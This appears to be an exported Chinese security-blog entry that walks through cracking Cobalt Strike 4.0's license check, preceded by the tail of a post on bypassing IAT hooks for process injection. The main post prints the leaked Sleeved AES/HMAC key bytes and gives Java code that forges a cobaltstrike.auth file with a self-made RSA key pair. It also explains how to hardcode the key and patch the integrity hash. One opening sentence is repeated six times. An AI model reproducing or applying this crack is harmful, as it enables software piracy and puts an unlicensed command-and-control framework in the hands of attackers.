kernel32.dll!WriteProcessMemory kernel32.dll!CreateRemoteThread kernel32.dll!CloseHandle 效果如下： 完全没有被钩住。这就完全绕过了 IAT hooking。这里仅是绕过了 IAT hooking，在实战中，还需要处理 shellcode。 查看导出表情况： 后续随着 DInvoke 的完善，直接应用该库即可。这样无需自己定义函数，省时省力。 0x05 参考 [1] 【Marshal.GetDelegateForFunctionPointer】 [2] 【Offensive P/Invoke: Leveraging the Win32 API from Managed Code】 [3] 【Dynamic Invocation in .NET to bypass hooks】 [4] 【手游外挂基础篇之inline-hook】 [5] 【Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke &amp; API Hooks)】 [6] 【Process Injection using DInvoke】]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>知识回顾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【知识回顾】Cobalt Strike 4.0 认证及修补过程]]></title>
    <url>%2F2020%2F11%2F%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91Cobalt%20Strike%204.0%E8%AE%A4%E8%AF%81%E5%8F%8A%E4%BF%AE%E8%A1%A5%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[想要理解整个认证过程，必须要动手走一轮代码。 想要理解整个认证过程，必须要动手走一轮代码。 想要理解整个认证过程，必须要动手走一轮代码。 想要理解整个认证过程，必须要动手走一轮代码。 想要理解整个认证过程，必须要动手走一轮代码。 想要理解整个认证过程，必须要动手走一轮代码。 该文章在星球里吃了几个月的灰，后来看到 SleevedKey 在网上已经可以随便搜到，所以就索性放出来了。已先投稿先知社区，链接为：https://xz.aliyun.com/t/8557 0x00 前言这里提供了 CS 4.0 的认证过程，个人认为非常详细，文中配备认证的流程图，可以结合文中的代码注释，外加自己的 IDEA 调试，可以完整理解整个过程。因为 4.0 与 4.1 差了一个关键 key（前期的处理方式也多了一个步骤），因此这里就只针对 4.0 版本的认证进行说明。 附件中提供了 CSHook.jar，是针对 CS 4.1 版本的，并且文章中也明确提供了适用于 CS 4.1 的完整 key（使用该 key 需要删除多余的步骤，直接使用 4.0 的验证）。 很多人拿到原版之所以没有搞破解，是因为缺少了最重要的 Sleeved 解密 key。 其实，到了 4.X 版本，是没有办法进行”破解”的，因为 AES 的密钥是无法进行破译，所以 Sleeved 解密 key 只能等好心人提供。 CobaltStrike 4.X 的认证，如果对 Java 及密码学相关有所了解，理解起来并不难。但是对于它的破解来说，需要一个针对 Sleeved 模块的认证 key，这个 key 是无法进行穷举的，除非想不开了。因此对于破解来说，与其说破解，还不如说是将 key 进行补全了。 0x01 准备工作1.1、必备知识1.1.1、RAS 算法之加密与签名的区别 加密和签名都是为了安全性考虑，但略有不同。常有人问加密和签名是用私钥还是公钥？其实都是对加密和签名的作用有所混淆。简单的说，加密是为了防止信息被泄露，而签名是为了防止信息被篡改。这里举 2 个例子说明。 第一个场景：战场上，B 要给 A 传递一条消息，内容为某一指令。 RSA 的加密过程如下： 123（1）A 生成一对密钥（公钥和私钥），私钥不公开，A 自己保留。公钥为公开的，任何人可以获取。（2）A 传递自己的公钥给 B，B 用 A 的公钥对消息进行加密。（3）A 接收到 B 加密的消息，利用 A 自己的私钥对消息进行解密。 在这个过程中，只有 2 次传递过程，第一次是 A 传递公钥给 B，第二次是 B 传递加密消息给 A，即使都被敌方截获，也没有危险性，因为只有A的私钥才能对消息进行解密，防止了消息内容的泄露。 第二个场景：A 收到 B 发的消息后，需要进行回复“收到”。 RSA 签名的过程如下： 123（1）A 生成一对密钥（公钥和私钥），私钥不公开，A 自己保留。公钥为公开的，任何人可以获取。（2）A 用自己的私钥对消息加签，形成签名，并将加签的消息和消息本身一起传递给 B。（3）B 收到消息后，在获取 A 的公钥进行验签，如果验签出来的内容与消息本身一致，证明消息是 A 回复的。 在这个过程中，只有 2 次传递过程，第一次是 A 传递加签的消息和消息本身给 B，第二次是 B 获取 A 的公钥，即使都被敌方截获，也没有危险性，因为只有 A 的私钥才能对消息进行签名，即使知道了消息内容，也无法伪造带签名的回复给 B，防止了消息内容的篡改。 但是，综合两个场景你会发现，第一个场景虽然被截获的消息没有泄露，但是可以利用截获的公钥，将假指令进行加密，然后传递给 A。第二个场景虽然截获的消息不能被篡改，但是消息的内容可以利用公钥验签来获得，并不能防止泄露。所以在实际应用中，要根据情况使用，也可以同时使用加密和签名，比如 A 和 B 都有一套自己的公钥和私钥，当 A 要给 B 发送消息时，先用 B 的公钥对消息加密，再对加密的消息使用 A 的私钥加签名，达到既不泄露也不被篡改，更能保证消息的安全性。 总结：公钥加密、私钥解密；私钥签名、公钥验签。 但是，有一个要注意的是： 12当你用公钥加密的时候，需要用私钥解密。当你用私钥加密的时候，需要用公钥解密。 1.1.2、HMAC 消息摘要算法MAC，全称 Message Authentication Code，也称为消息认证码（带密钥的Hash函数），通信实体双方使用的一种验证机制，保证消息数据完整性的一种工具。 在发送数据之前，发送方首先使用通信双方协商好的散列函数计算其摘要值。在双方共享的会话密钥作用下，由摘要值获得消息验证码。之后，它和数据一起被发送。接收方收到报文后，首先利用会话密钥还原摘要值，同时利用散列函数在本地计算所收到数据的摘要值，并将这两个数据进行比对。若两者相等，则报文通过认证。 说白了就是计算摘要的时候，需要一个秘钥 key，没有秘钥 key 就无法计算 1.1.3、AES 破解 AES 算法需要多长时间？ 以 AES-128 算法为例，平均需要尝试 2^127 ≈ 1.7*10^38 个 128bit 的随机数作为密钥进行加解密运算，方能找到正确的密钥。 常言道，“天下武功，唯快不破”；反之，天下密码，快必可破。问题是，那得有多快？我们知道，比特币网络在全球范围内调用了非常庞大的硬件资源以达到极高的运算效率，每秒钟操作的 Hash 运算（SHA-256）可高达 2.5644*10^19次。虽然 AES 和 SHA-256 算法并不相同，运算量也有所差异，但我们不妨近似地用该数据估算全球人民众志成城破解 AES 算法所需要的时间。 假设 AES 的运算效率为 2.564410^19 ≈ 2^64.4753 次/秒，则进行 2^127 次 AES 运算所需要的时间为：2^127 / 2^64.4753 ≈ 2^62.5247秒 ≈ 6.6345 10^18 秒 ≈ 1.8429 10^15 小时 ≈ 7.6789 10^13 天 ≈ 2.104 * 10^11年 ≈ 210,400,000,000 年 1.2、运行环境此次破解测试使用的工具及文件为： IntelliJ IDEA Community Edition 2020.1.4 Feb 22, 2020 - Cobalt Strike 4.0 使用过 IDEA 的朋友都知道，它具备反编译 Jar 包的能力。 首先，我们使用 IDEA 新建一个工程，将原始 Jar 包作为依赖进行导入，如下图所示： 此时 IDEA 将调用反编译模块，因此我们可以直接查看 jar 的源码，如图所示： 但由于单个文件点击，并不利于我们的有效查看，因此可以提取 IDEA 的反编译功能，用于对原始 Jar 包的反编译。 下面我们进行测试，IDEA 的反编译功能依赖于 java-decompiler.jar ，该文件存在于以下路径当中： 1%IDEA安装目录%\plugins\java-decompiler\lib\java-decompiler.jar 其使用方法为: 1java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true c:\my.jar d:\decompiled\ 将反编译后的 Jar 包进行解压，将解压的文件（带文件夹）放入 src（该步骤仅将需要更改的文件放入即可，当然，全部放也没关系），文件夹内，如下图所示： 然后就是设置编译生成 Jar 的步骤。 在 Main Class 中填写 aggressor.Aggressor，其余默认即可；然后尝试 Build Artifacts...，正常情况下，则生成一个新的 Jar 包。 最后，为了方便实时预览及调试，我们需要对 Run 进行简单设置。 123456781.新建一个 run 配置2.添加 JAR Application3.选择运行的 Jar 包路径4.配置启动该 Jar 包的虚拟选项5.选择一个在执行 Run 操作时附带的操作6.此处选择重新 Build Artiface注意：如果不选择 5-6 步骤，则在点击 Run 前，需要手动 Build Artiface。 实践一下，是否配置都正常。出现以下信息就说明可行。 这部分内容不理解的朋友，可以去看看红队学院（知识星球）相关视频：RedCore 红队学院 CSTips 0x02 CS 3.X 版本的认证过程其实，我们可以从头开始走一轮认证代码，3.X 相对简单，走下来其实不难。 主要涉及的文件： 1234common/License // license 检查逻辑common/Authorization // 检查的细节实现common/AuthCrypto // RSA 解密和解压common/CommonUtils // 相关数据类型转换辅助 先粗略说一下 3.X 的 .auth 整个加密过程是： 123先对文本进行压缩，转换为 byte添加特征头 0xca, 0xfe, 0xc0, 0xbb,0x00, 0x43使用 RSA 进行加密 故此解密的话只需要逆向此流程即可，那么我们要伪造一个自己的授权文件的话，只需要把公钥替换为自己的，然后使用自己的私钥对文本内容进行加密即可。因为只有在验证 GUI 和 Console 的时候需要进行验证步骤，因此也可以直接写死 isValid()、isPerpetual() 和 isAlmostExpired() 的值。比如： 12345678public Authorization() &#123; this.valid = true; this.validto = "forever"; this.licensekey = "Cartier"; this.watermark = 1; MudgeSanity.systemDetail("valid to", "perpetual"); MudgeSanity.systemDetail("id", this.watermark + ""); &#125; 4.0 相比于 3.14 版本，多了一轮新的验证及更为复杂。 0x03 CS 4 .X 版本的认证过程之所以只说这个 CS 4.x 的认证过程，是因为该认证是在 3.X 的基础上进行改进的。 首先从主函数开始查看，第一步认证：License.checkLicenseGUI(new Authorization());，我们在查看源码过程中，直接对源码进行注释即可。 1234567891011121314151617181920public class Aggressor &#123; public static final String VERSION = "4.0 (20200222) " + (License.isTrial() ? "Trial" : "Licensed"); public static MultiFrame frame = null; public static MultiFrame getFrame() &#123; return frame; &#125; public static void main(String[] var0) &#123; ParserConfig.installEscapeConstant('c', "\u0003"); ParserConfig.installEscapeConstant('U', "\u001f"); ParserConfig.installEscapeConstant('o', "\u000f"); (new UseSynthetica()).setup(); Requirements.checkGUI(); // 认证开始 License.checkLicenseGUI(new Authorization()); frame = new MultiFrame(); (new ConnectDialog(frame)).show(); &#125;&#125; 3.1、checkLicenseGUI()该函数是 CobaltStrike 的第一道验证，主要检查授权文件是否存在、解析的数据是否正确。 12345678910111213141516171819202122public static void checkLicenseGUI(Authorization var0) &#123; // 判断文件是否存在、有效，格式是否正确等，isValid 函数是一个 flag，默认为 false if (!var0.isValid()) &#123; CommonUtils.print_error("Your authorization file is not valid: " + var0.getError()); JOptionPane.showMessageDialog((Component)null, "Your authorization file is not valid.\n" + var0.getError(), (String)null, 0); System.exit(0); &#125; // 判断是否过期 if (!var0.isPerpetual()) &#123; if (var0.isExpired()) &#123; CommonUtils.print_error("Your Cobalt Strike license is expired. Please contact sales@strategiccyber.com to renew. If you did renew, run the update program to refresh your authorization file."); JOptionPane.showMessageDialog((Component)null, "Your Cobalt Strike license is expired.\nPlease contact sales@strategiccyber.com to renew\n\nIf you did renew, run the update program to refresh your\nauthorization file.", (String)null, 0); System.exit(0); &#125; // 计算有效期 if (var0.isAlmostExpired()) &#123; CommonUtils.print_warn("Your Cobalt Strike license expires in " + var0.whenExpires() + ". Email sales@strategiccyber.com to renew. If you did renew, run the update program to refresh your authorization file."); JOptionPane.showMessageDialog((Component)null, "Your Cobalt Strike license expires in " + var0.whenExpires() + "\nEmail sales@strategiccyber.com to renew\n\nIf you did renew, run the update program to refresh your\nauthorization file.", (String)null, 1); &#125; &#125;&#125; 首先是对 GUI 的一个验证，该验证有且仅有一次验证；它是调用 Authorization 类 中的 isValid()、isPerpetual() 和 isAlmostExpired()进行校验。 12345isValid() // 判断文件是否存在、有效，格式是否正确等，isValid函数是一个flag，默认为falseisPerpetual() // 判断 forever 关键字是否存在，存在则结束函数isAlmostExpired() - // 计算有效期注：这三个函数方法的返回可直接写死，以绕过验证。 而它们都依赖于 Authorization.Authorization()，因此我们需要先对 Authorization() 进行分析。 3.2、Authorization() 的分析过程在 Authorization 类中，我们只需要查看 Authorization() 函数即可。 该函数主要解析授权码字段构成和有效期的计算，并且调用了 AuthCrypto 类的 decrypt 函数对文件进行解密，详细信息请看代码注释。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869public Authorization() &#123; // 读取当前目录中的 cobaltstrike.auth 文件 String str = CommonUtils.canonicalize("cobaltstrike.auth"); // 判断文件是否存在 if (!(new File(str)).exists()) &#123; try &#123; File localFile = new File(this.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()); if (localFile.getName().toLowerCase().endsWith(".jar")) &#123; localFile = localFile.getParentFile(); &#125; str = (new File(localFile, "cobaltstrike.auth")).getAbsolutePath(); &#125; catch (Exception localException1) &#123; // 未找到该用于身份验证文件 MudgeSanity.logException("trouble locating auth file", localException1, false); &#125; &#125; // 以 byte[]方式读取 cobaltstrike.auth 文件内容 byte[] arrayOfByte1 = CommonUtils.readFile(str); // 判断长度，取决于文件内容 if (arrayOfByte1.length == 0) &#123; this.error = "Could not read " + str; &#125; else &#123; // 初始化 AuthCrypto 类，并在初始化时调用 load()，以校验 authkey.pub 文件是否符合要求 AuthCrypto authCrypto = new AuthCrypto(); // 调用 AuthCrypto 类中的 decrypt 方法对 cobaltstrike.auth 文件内容进行解密，校验文件是否符合要求，并返回 byte byte[] arrayOfByte2 = authCrypto.decrypt(arrayOfByte1); if (arrayOfByte2.length == 0) &#123; this.error = authCrypto.error(); &#125; else &#123; try &#123; // 相比 3.14 版本，多了个 DateaParser，是用于解析 byte 类型数据的类 DataParser dataParser = new DataParser(arrayOfByte2); dataParser.big(); // 该值是用于判断是否永久有效（是否为发行版） int i = dataParser.readInt(); // 该值应该是水印作用。该值如果为 0，则在生成的 shellcode 中会带入 cs 水印（common/ListnerConfig.class） this.watermark = dataParser.readInt(); // 该值是用于判断认证是否用于 Cobalt Strike 4.0+ byte j = dataParser.readByte(); // 取 16 个字节 byte k = dataParser.readByte(); // 获取关键 key，该 key是用于解密 Sleeved 的关键。 byte[] arrayOfByte3 = dataParser.readBytes(k); if (j &lt; 40) &#123; this.error = "Authorization file is not for Cobalt Strike 4.0+"; return; &#125; if (i == 29999999) &#123; // 判断是否为 forever this.validto = "forever"; MudgeSanity.systemDetail("valid to", "perpetual"); &#125; else &#123; // 否则跳到试用期为20天 this.validto = "20" + i; CommonUtils.print_stat("Valid to is: '" + this.validto + "'"); MudgeSanity.systemDetail("valid to", CommonUtils.formatDateAny("MMMMM d, YYYY", this.getExpirationDate())); &#125; this.valid = true; MudgeSanity.systemDetail("id", this.watermark + ""); // 4.0 的 key 为 &#123;27, -27, -66, 82, -58, 37, 92, 51, 85, -114, -118, 28, -74, 103, -53, 6&#125; SleevedResource.Setup(arrayOfByte3); &#125; catch (Exception localException2) &#123; MudgeSanity.logException("auth file parsing", localException2, false); &#125; &#125; &#125;&#125; 3.3、AuthCrypto 类看看对 authkey.pub 及 cobaltstrike.auth 解密的类。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106/** 解密函数解析，主要是涉及 RSA 解密和 gzip 解压相关操作，这里作者其实是在文件头加了四个字节* */public final class AuthCrypto &#123; public Cipher cipher; public Key pubkey = null; protected String error = null; public AuthCrypto() &#123; try &#123; // 构造方法中生成了一个 RSA/ECB/PKCS1Padding 的 ciper this.cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding"); this.load(); &#125; catch (Exception var2) &#123; this.error = "Could not initialize crypto"; MudgeSanity.logException("AuthCrypto init", var2, false); &#125; &#125; // Load() -&gt; 加载公钥，验证哈希 public void load() &#123; // RSA 解密常规初始化操作 try &#123; // 读取 authkey.pub byte[] arrayOfByte1 = CommonUtils.readAll(CommonUtils.class.getClassLoader().getResourceAsStream("resources/authkey.pub")); // MD5 操作 byte[] arrayOfByte2 = CommonUtils.MD5(arrayOfByte1); // 对比 hash，以校验 authkey.pub 文件是否符合要求 if (!"8bb4df00c120881a1945a43e2bb2379e".equals(CommonUtils.toHex(arrayOfByte2))) &#123; // 无效的授权文件 CommonUtils.print_error("Invalid authorization file"); System.exit(0); &#125; X509EncodedKeySpec localX509EncodedKeySpec = new X509EncodedKeySpec(arrayOfByte1); KeyFactory localKeyFactory = KeyFactory.getInstance("RSA"); // RSA 公钥 this.pubkey = localKeyFactory.generatePublic(localX509EncodedKeySpec); &#125; catch (Exception var5) &#123; this.error = "Could not deserialize authpub.key"; MudgeSanity.logException("authpub.key deserialization", var5, false); &#125; &#125; public String error() &#123; return this.error; &#125; /* * 解密 cobaltstrike.auth 的主函数，如果返回不为 null，则校验通过。 * */ public byte[] decrypt(byte[] paramArrayOfByte) &#123; // RSA 解密，并返回 byte 数组 byte[] arrayOfByte1 = this._decrypt(paramArrayOfByte); try &#123; if (arrayOfByte1.length == 0) &#123; return arrayOfByte1; &#125; else &#123; // 将解密好的数据，交给了 DataParser DataParser localDataParser = new DataParser(arrayOfByte1); localDataParser.big(); // byte 数组转有符号 Int -&gt; 取头部 4个字节判断文件头是否正确，这里并不是标准的 gzip头 -&gt; byte[] b = &#123;-54, -2, -64, -45&#125; // 注：有符号数最高位为1，表示负数；最高位为0，表示正数 int i = localDataParser.readInt(); if (i == -889274181) &#123; this.error = "pre-4.0 authorization file. Run update to get new file"; return new byte[0]; &#125; else if (i != -889274157) &#123; this.error = "bad header"; return new byte[0]; &#125; else &#123; // 处理文件头并解压 int j = localDataParser.readShort(); byte[] arrayOfByte2 = localDataParser.readBytes(j); return arrayOfByte2; &#125; &#125; &#125; catch (Exception localException) &#123; this.error = localException.getMessage(); return new byte[0]; &#125; &#125; /* * 这个函数需要注意的是，代入的数据是使用 RSA 公钥进行解密的，然后返回解密后的数据。 * 因此在生成 .auth 的时候，应该使用密钥进行加密。 */ protected byte[] _decrypt(byte[] paramArrayOfByte) &#123; byte[] arrayOfByte = new byte[0]; try &#123; if (this.pubkey == null) &#123; return new byte[0]; &#125; else &#123; synchronized(this.cipher) &#123; this.cipher.init(2, this.pubkey); arrayOfByte = this.cipher.doFinal(paramArrayOfByte); &#125; return arrayOfByte; &#125; &#125; catch (Exception localException) &#123; this.error = localException.getMessage(); return new byte[0]; &#125; &#125;&#125; 结合上述两个代码，如果验证通过，则可以打开客户端页面。这与 3.X 的认证大致相同。 3.4、SleevedResource 类与 3.X 不同的是，4.X 在 Authorization() 中新增了一个新的验证 SleevedResource.Setup()。该验证的大致流程为： 123451、使用 .auth 文件的一部分数据作为一个 key，将该 key 再进行处理拆分；2、程序调用内置的 dll 文件；3、读取 dll 文件，对 dll 文件进行处理拆分；4、使用拆分的 key 分别对拆分的 dll 分别进行 hmac 摘要验证及 AES 解密。5、最后执行 dll。 跟进 SleevedResource.Setup(arrayOfByte3); 看一看： 12345678910111213141516171819202122232425262728293031323334353637383940414243public class SleevedResource &#123; private static SleevedResource singleton; private SleeveSecurity data = new SleeveSecurity(); public static void Setup(byte[] paramArrayOfByte) &#123; singleton = new SleevedResource(paramArrayOfByte); &#125; public static byte[] readResource(String paramString) &#123; return singleton._readResource(paramString); &#125; private SleevedResource(byte[] paramArrayOfByte) &#123; // 将 16 个字节的数据传入 SleeveSecurity.registerKey() 中 this.data.registerKey(paramArrayOfByte); &#125; /* * 这是一个读取文件，并对文件进行解密的函数方法 * paramString 是一个文件名（文件相对路径） * */ private byte[] _readResource(String paramString) &#123; // strrep 是将 paramString 文件路径中的 resources/ 替换成 sleeve/ String str = CommonUtils.strrep(paramString, "resources/", "sleeve/"); // 替换之后实际上是读取 jar 包中 sleeve 目录下的文件，返回一个 byte[] byte[] arrayOfByte1 = CommonUtils.readResource(str); if (arrayOfByte1.length &gt; 0) &#123; long l = System.currentTimeMillis(); // 将读取的文件 byte[] 代入解密阶段 byte[] arrayOfByte2 = this.data.decrypt(arrayOfByte1); return arrayOfByte2; &#125; else &#123; // 不经过替换，直接读取源文件(sleeve 中不存在的文件，在 resources 中存在) byte[] arrayOfByte3 = CommonUtils.readResource(paramString); if (arrayOfByte3.length == 0) &#123; CommonUtils.print_error("Could not find sleeved resource: " + paramString + " [ERROR]"); &#125; else &#123; CommonUtils.print_stat("Used internal resource: " + paramString); &#125; return arrayOfByte3; &#125; &#125;&#125; 发现调用 SleevedResource 类的构造函数并将该 byte 数组传递给了 dns.SleeveSecurity 的 registerKey() 方法，继续跟进该方法： 123456789101112131415161718public void registerKey(byte[] paramArrayOfByte) &#123; synchronized(this) &#123; try &#123; MessageDigest localMessageDigest = MessageDigest.getInstance("SHA-256"); // 首先利用我们的 array，获取了一个 digest，大小是 256 byte[] arrayOfByte1 = localMessageDigest.digest(paramArrayOfByte); byte[] arrayOfByte2 = Arrays.copyOfRange(arrayOfByte1, 0, 16); byte[] arrayOfByte3 = Arrays.copyOfRange(arrayOfByte1, 16, 32); // 取了 arrayOfByte1 的 0-16 作为 AES 的加密 key this.key = new SecretKeySpec(arrayOfByte2, "AES"); // 取了arrayOfByte1 的 16-32 作为 Hmac 的加密 key this.hash_key = new SecretKeySpec(arrayOfByte3, "HmacSHA256"); &#125; catch (Exception var8) &#123; var8.printStackTrace(); &#125; &#125;&#125; 嗯，到这里没见到往下走的验证了，估摸着第一轮验证就结束了。 此时启动 teamserver，则会在 temserver 中看到一个错误： 1[-] [Sleeve] Bad HMAC on xxxxx byte message from resource 注意：此验证是在调用 CS 内置 EXE/DLL 时所需要的，当验证不通过时，则出现该错误。因此当在绕过了开头的限制，则可以开启客户端，只不过功能受影响；只有该验证顺利通过，才是完全授权验证。 3.4、decrypt() 方法调用链我们搜索该错误，在 SleeveSecurity.decrypt() 中找到。 我们依次查看调用链： 我们在 SleevedResource 中看到此 decrypt() 方法的调用。而 readResource() 则调用了 _readResource()。我们再查看关于 readResource() 的调用： 我们就此挑选比较干净的调用例子来分析。 1234567891011protected byte[] export_dll() &#123; // 判断框架位数，之后传入一个文件 byte[] arrayOfByte = SleevedResource.readResource(this.x64 ? "resources/browserpivot.x64.dll" : "resources/browserpivot.dll"); String str = CommonUtils.bString(arrayOfByte); Packer packer = new Packer(); packer.little(); packer.addShort(this.port); int i = str.indexOf("COBALTSTRIKE"); str = CommonUtils.replaceAt(str, CommonUtils.bString(packer.getBytes()), i); return CommonUtils.toBytes(str);&#125; 此时回头查看 _readResource() 函数。 12345678910111213141516171819202122232425/** 这是一个读取文件，并对文件进行解密的函数方法* paramString 是一个文件名（文件相对路径）* */private byte[] _readResource(String paramString) &#123; // strrep 是将 paramString 文件路径中的 resources/ 替换成 sleeve/ String str = CommonUtils.strrep(paramString, "resources/", "sleeve/"); // 替换之后实际上是读取 jar 包中 sleeve 目录下的文件 byte[] arrayOfByte1 = CommonUtils.readResource(str); if (arrayOfByte1.length &gt; 0) &#123; long l = System.currentTimeMillis(); // 将读取的文件 byte[] 代入解密阶段 byte[] arrayOfByte2 = this.data.decrypt(arrayOfByte1); return arrayOfByte2; &#125; else &#123; // 不经过替换，直接读取源文件(sleeve 中不存在的文件，在 resources 中存在) byte[] arrayOfByte3 = CommonUtils.readResource(paramString); if (arrayOfByte3.length == 0) &#123; CommonUtils.print_error("Could not find sleeved resource: " + paramString + " [ERROR]"); &#125; else &#123; CommonUtils.print_stat("Used internal resource: " + paramString); &#125; return arrayOfByte3; &#125;&#125; 我们重点来看这个解密。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/** 该函数是从 license文件中获取的 2 个 key 进行一些列的验证解密；* 最终将加密的 dll 文件进行解密返回。* paramArrayOfbyte 是源文件读取出来的 byte[] 数据*/public byte[] decrypt(byte[] paramArrayOfbyte) &#123; try &#123; // 取 paramArrayOfbyte 的开头至倒数 -16 的数据，这段数据是 dll 的主体数据 byte[] arrayOfByte1 = Arrays.copyOfRange(paramArrayOfbyte, 0, paramArrayOfbyte.length - 16); // 取 paramArrayOfbyte 的剩下的 16 位数据。 byte[] arrayOfByte2 = Arrays.copyOfRange(paramArrayOfbyte, paramArrayOfbyte.length - 16, paramArrayOfbyte.length); byte[] arrayOfByte3 = null; synchronized(this) &#123; // 先用我们在 license中生成的 hash_key 作为密钥，对 arrayOfByte1 进行摘要计算 this.mac.init(this.hash_key); arrayOfByte3 = this.mac.doFinal(arrayOfByte1); &#125; // 取 arrayOfByte3 的前 16位数据 byte[] arrayOfByte4 = Arrays.copyOfRange(arrayOfByte3, 0, 16); // 两两对比，如果相等，则步入 else。该对比，主要防止 dll 被篡改。 if (!MessageDigest.isEqual(arrayOfByte2, arrayOfByte4)) &#123; CommonUtils.print_error("[Sleeve] Bad HMAC on " + paramArrayOfbyte.length + " byte message from resource"); return new byte[0]; &#125; else &#123; byte[] arrayOfByte5 = null; synchronized(this) &#123; // 在对比成功后，将使用 key 对 dll主体内容数据进行 AES 解密 arrayOfByte5 = this.do_decrypt(this.key, arrayOfByte1); &#125; DataInputStream dataInputStream = new DataInputStream(new ByteArrayInputStream(arrayOfByte5)); int i = dataInputStream.readInt(); int j = dataInputStream.readInt(); if (j &gt;= 0 &amp;&amp; j &lt;= paramArrayOfbyte.length) &#123; byte[] var10 = new byte[j]; dataInputStream.readFully(var10, 0, j); // 最后返回解密后的文件，以便调用 return var10; &#125; else &#123; CommonUtils.print_error("[Sleeve] Impossible message length: " + j); return new byte[0]; &#125; &#125; &#125; catch (Exception exception) &#123; exception.printStackTrace(); return new byte[0]; &#125;&#125; 这个方法要在初始验证阶段是不会进行调用的，为了方便调试，直接在 registerKey() 写个调用即可，比如： 我们只是捋清整个需要认证的过程，不细讨其他的东西，因此只需要知道 cobaltstrike.auth 文件的组成和用处即可。 3.5、认证流程图 0x04 破解方法理论上，穷举 Authorization() 中的 arrayOfByte3 有些不现实；因为逆着推回去，需要推出 hmac 的 key，AES 的 key，是我想多了。 因此，至少需要知道 arrayOfByte3 的值才可能正常运行成功。但在有这个关键 key 的前提下，我们可以这么做。 4.1、重新生成 license也就是说，我们要伪造一个自己的授权文件的话， 只需要生成自己的 RSA 公私钥，然后使用私钥对文本内容进行加密，将公钥保存成 authpub.key ，并计算 MD5 值，对 AuthCrypto.class 中的 8bb4df00c120881a1945a43e2bb2379e 进行替换即可。这里的做法就是 Cobaltstrike 4破解之 我自己给我自己颁发license 中的做法。 4.1.1、.auth 文件组成由对 Authorization() 的分析过程可以得出文本内容应该由这些有效元素构成： 12345678910将 .auth 文件读取成 byte[]，处理之后得出 26 位的 byte[]，将其拆分为：4位 -&gt; 经过有符号转换 int，结果为29999999 -&gt; 用于判断是否永久有效（是否为发行版）4位 -&gt; 经过有符号转换 int，结果不为 0 即可 -&gt; 水印1位 -&gt; 该 byte 值必须是大于 40 且小于 128 -&gt; 判断认证是否适合 4.x1位 -&gt; 该 byte 值必须是 16 -&gt; key 的长度16位 -&gt; 该 key 理论上无法逆推要注意的是：处理 .auth 文件的时候，还需要判断文件头...，因此还需要填充文件头，但按照分析下来，是 4 个字节，但在实测过程中，发现是 6 个字节因此 .auth 文件的必要数据是 32 位 -&gt; 6 + 4 + 4 + 1 + 1 + 16 因此我们只需要逆推 DataParser 中的 readInt() 就可以得到想要的内容。 因此在解析 .auth 后返回的 byte[] 应该为： 1byte[] decrypt = &#123; 1, -55, -61, 127, 0, 0, 34, -112, 127, 16, 27, -27, -66, 82, -58, 37, 92, 51, 85, -114, -118, 28, -74, 103, -53, 6 &#125;; 代入测试： 4.1.2、生成 RSA 公钥、私钥及签名该步骤，主要是生成 RSA 公私钥，然后使用私钥对上述生成的数据进行加密（注意，当你用私钥加密的时候，需要用公钥解密）后保存到 cobaltstrike.auth中。 你可以使用 openssl 生成，使用 2048 位即可，也可以使用代码生成，参考代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.NoSuchPaddingException;import java.io.*;import java.security.*;import java.util.Base64;public class RSAKeyPairGenerator &#123; private PrivateKey privateKey; private PublicKey publicKey; public RSAKeyPairGenerator() throws NoSuchAlgorithmException &#123; KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA"); keyGen.initialize(2048); KeyPair pair = keyGen.generateKeyPair(); this.privateKey = pair.getPrivate(); this.publicKey = pair.getPublic(); &#125; // 将byte 写入文件 public void byte2File(String path, byte[] data) throws IOException &#123; File f = new File(path); f.getParentFile().mkdirs(); FileOutputStream fos = new FileOutputStream(f); fos.write(data); fos.flush(); fos.close(); &#125; public PrivateKey getPrivateKey() &#123; return privateKey; &#125; public PublicKey getPublicKey() &#123; return publicKey; &#125; // 加密数据 public byte[] encryptPri(byte[] data, PrivateKey privateKey) throws BadPaddingException, IllegalBlockSizeException, InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException &#123; Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding"); cipher.init(Cipher.ENCRYPT_MODE, this.privateKey); return cipher.doFinal(data); &#125; public static void main(String[] args) throws NoSuchAlgorithmException, IOException, IllegalBlockSizeException, InvalidKeyException, NoSuchPaddingException, BadPaddingException &#123; RSAKeyPairGenerator PairGenerator = new RSAKeyPairGenerator(); byte[] data = &#123; -54, -2, -64, -45, 0, 43, 1, -55, -61, 127, 0, 0, 34, -112, 127, 16, 27, -27, -66, 82, -58, 37, 92, 51, 85, -114, -118, 28, -74, 103, -53, 6 &#125;; byte[] rsaByte = PairGenerator.encryptPri(data, PairGenerator.getPrivateKey()); PairGenerator.byte2File("RSA/cobaltstrike.auth", rsaByte); PairGenerator.byte2File("RSA/authkey.private", PairGenerator.getPrivateKey().getEncoded()); PairGenerator.byte2File("RSA/authkey.pub", PairGenerator.getPublicKey().getEncoded()); &#125;&#125; 成功生成，剩下的就是替换相关文件，再更改 AuthCrypto.load() 中的 MD5 值。 4.2、硬编码 key直接在 Authorization() 中注释掉以下代码行： 12byte[] arrayOfByte2 = authCrypto.decrypt(arrayOfByte1);注释部分可以扩大到读取 cobaltstrike.auth 部分 然后直接将解析后的 byte[] 进行写入 1byte[] arrayOfByte2 = &#123; 1, -55, -61, 127, 0, 0, 34, -112, 127, 16, 27, -27, -66, 82, -58, 37, 92, 51, 85, -114, -118, 28, -74, 103, -53, 6 &#125;; 4.3、CSHook.jar以上两种方法都对 Jar 